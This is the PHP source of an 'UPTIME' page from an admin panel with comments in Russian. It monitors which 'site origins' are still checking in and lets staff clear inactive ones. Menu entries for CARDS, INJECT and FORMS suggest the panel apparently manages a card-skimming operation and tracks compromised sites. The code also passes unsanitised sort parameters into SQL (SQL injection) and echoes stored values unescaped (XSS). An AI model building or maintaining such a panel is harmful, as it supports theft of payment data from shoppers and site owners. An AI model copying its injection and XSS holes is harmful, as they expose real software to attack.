<?php
session_start();
// Получаем роль текущего пользователя из сессии
$userRole = $_SESSION['user_role'];

if (!isset($_SESSION['user_logged_in'])) {
    header('Location: login.php');
    exit();
}

// Проверяем, является ли пользователь администратором или техническим специалистом
if (!isset($_SESSION['user_role']) || ($_SESSION['user_role'] !== 'admin' && $_SESSION['user_role'] !== 'tech')) {
    header('Location: dashboard.php');
    exit();
}
require 'includes/config.php';

function getCurrentTime() {
    // Для тестирования используйте фиксированную дату
    // return strtotime('2024-09-09 10:00:17');
    return time(); // Для реальной системы
}

// Обработка действий очистки и удаления неактивных сайтов
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];

    if ($action === 'clear_all') {
        // Очистка всех данных в таблице site_activity
        $query = "TRUNCATE TABLE site_activity";
        $db->query($query);
    } elseif ($action === 'clear_inactive') {
        // Удаление данных неактивных сайтов из таблицы site_activity
        $currentTime = getCurrentTime();
        $query = "DELETE FROM site_activity WHERE 
                  (connection_after_access IS NOT NULL AND TIMESTAMPDIFF(DAY, connection_after_access, FROM_UNIXTIME(?)) > 1)
                  OR
                  (connection_after_access IS NULL AND TIMESTAMPDIFF(DAY, last_connection_time, FROM_UNIXTIME(?)) > 1)";
        $db->query($query, [$currentTime, $currentTime]);
    }

    // Перенаправление на страницу uptime.php после выполнения действия
    header('Location: uptime.php');
    exit();
}

// Получаем параметры сортировки из GET-запроса
$sort = isset($_GET['sort']) ? $_GET['sort'] : 'last_connection_time';
$order = isset($_GET['order']) ? $_GET['order'] : 'desc';

// Формируем запрос с учетом сортировки
$query = "SELECT site_origin, last_connection_time, connection_after_access FROM site_activity ORDER BY $sort $order";
$result = $db->query($query);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.8">
    <title>UPTIME Page</title>
    <link href="js/tailwind.min.css" rel="stylesheet">
    <link href="js/all.min.css" rel="stylesheet">
    <style>
        .bg-navy { background-color: #1a1a1a; }
        .border-gold { border-color: #2f2e2c; }
        .text-gold { color: #d4af37; }
        .text-custom-green { color: #77b910; }
        .bg-subtle-red { background-color: rgba(255, 0, 0, 0.1); } /* Легкий красный фон */
    </style>
</head>
<body class="bg-navy text-gold">
    <div class="flex flex-col min-h-screen">
        <nav class="bg-navy border-b-2 px-6 py-4">
            <div class="container mx-auto flex justify-between items-center">
                <div class="flex space-x-4">
                    <a href="dashboard.php" class="text-yellow-500 hover:text-white">DASHBOARD</a>
                    <a href="cards.php?url_id=&country=&date=&records=20&sort=id&order=desc" class="text-yellow-500 hover:text-white">CARDS</a>
                    <a href="inject.php" class="text-yellow-500 hover:text-white">INJECT</a>
                    <a href="tools.php" class="text-yellow-500 hover:text-white">TOOLS</a>
                    <a href="forms.php" class="text-yellow-500 hover:text-white">FORMS</a>
                    <a href="uptime.php" class="text-yellow-500 hover:text-white">UPTIME</a>
                </div>
                <div>
                    <a href="logout.php" class="text-yellow-500 hover:text-white">LOGOUT</a>
                </div>
            </div>
        </nav>

        <div class="container mx-auto mt-8">
            <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
                <h1 class="text-2xl mb-4 text-center">UPTIME</h1>
                <table class="w-full text-left table-collapse mx-auto">
                    <thead>
                        <tr>
                            <th class="text-sm font-medium text-yellow-500 p-2 bg-navy cursor-pointer" onclick="sortTable('site_origin')">
                                Site Origin <?php echo $sort === 'site_origin' ? ($order === 'asc' ? '▲' : '▼') : ''; ?>
                            </th>
                            <th class="text-sm font-medium text-yellow-500 p-2 bg-navy cursor-pointer" onclick="sortTable('last_connection_time')">
                                Last Connection Time <?php echo $sort === 'last_connection_time' ? ($order === 'asc' ? '▲' : '▼') : ''; ?>
                            </th>
                            <th class="text-sm font-medium text-yellow-500 p-2 bg-navy cursor-pointer" onclick="sortTable('connection_after_access')">
                                Connection After Access <?php echo $sort === 'connection_after_access' ? ($order === 'asc' ? '▲' : '▼') : ''; ?>
                            </th>
                        </tr>
                    </thead>
                    <tbody class="align-baseline">
                        <?php
                        $currentTime = getCurrentTime();
                        while ($row = $result->fetch_assoc()) {
                            $siteOrigin = $row['site_origin'];
                            $lastConnectionTime = $row['last_connection_time'];
                            $connectionAfterAccess = $row['connection_after_access'];

                            $lastConnectionDiff = $currentTime - strtotime($lastConnectionTime);
                            $lastConnectionDaysDiff = floor($lastConnectionDiff / (60 * 60 * 24));

                            $isInactive = false;
                            if ($connectionAfterAccess !== null) {
                                $connectionAfterAccessDiff = $currentTime - strtotime($connectionAfterAccess);
                                $connectionAfterAccessDaysDiff = floor($connectionAfterAccessDiff / (60 * 60 * 24));
                                
                                if ($connectionAfterAccessDaysDiff > 2) {
                                    $status =  $connectionAfterAccess . '<span class="text-red-500">(inactive)</span> ';
                                    $isInactive = true;
                                } else {
                                    $status = $connectionAfterAccess;
                                }
                            } elseif ($lastConnectionDaysDiff > 2) {
                                $status =  $lastConnectionTime . '<span class="text-red-500">(inactive)</span> ';
                                $isInactive = true;
                            } else {
                                $status = 'No connection';
                            }

                            $rowClass = $isInactive ? 'bg-subtle-red' : 'bg-gray-800';

                            echo "<tr class='$rowClass'>";
                            echo "<td class='p-2 border-b border-gold'><a href='$siteOrigin' target='_blank' class='text-custom-green hover:text-white'>$siteOrigin</a></td>";
                            echo "<td class='p-2 border-b border-gold'>$lastConnectionTime</td>";
                            echo "<td class='p-2 border-b border-gold'>$status</td>";
                            echo "</tr>";
                        }
                        ?>
                    </tbody>
                </table>

                <div class="mt-4 flex justify-end space-x-4">
                    <form action="uptime.php" method="post">
                        <input type="hidden" name="action" value="clear_all">
                        <button type="submit" class="bg-yellow-500 hover:bg-yellow-600 text-white font-bold py-2 px-4 rounded">
                            Clear All Sites
                        </button>
                    </form>
                    <form action="uptime.php" method="post">
                        <input type="hidden" name="action" value="clear_inactive">
                        <button type="submit" class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded">
                            Clear Inactive Sites
                        </button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script>
        function sortTable(column) {
            const url = new URL(window.location.href);
            const searchParams = url.searchParams;

            const currentSort = searchParams.get('sort');
            const currentOrder = searchParams.get('order');

            if (currentSort === column) {
                searchParams.set('order', currentOrder === 'asc' ? 'desc' : 'asc');
            } else {
                searchParams.set('sort', column);
                searchParams.set('order', 'asc');
            }

            url.search = searchParams.toString();
            window.location.href = url.toString();
        }
    </script>
</body>
</html>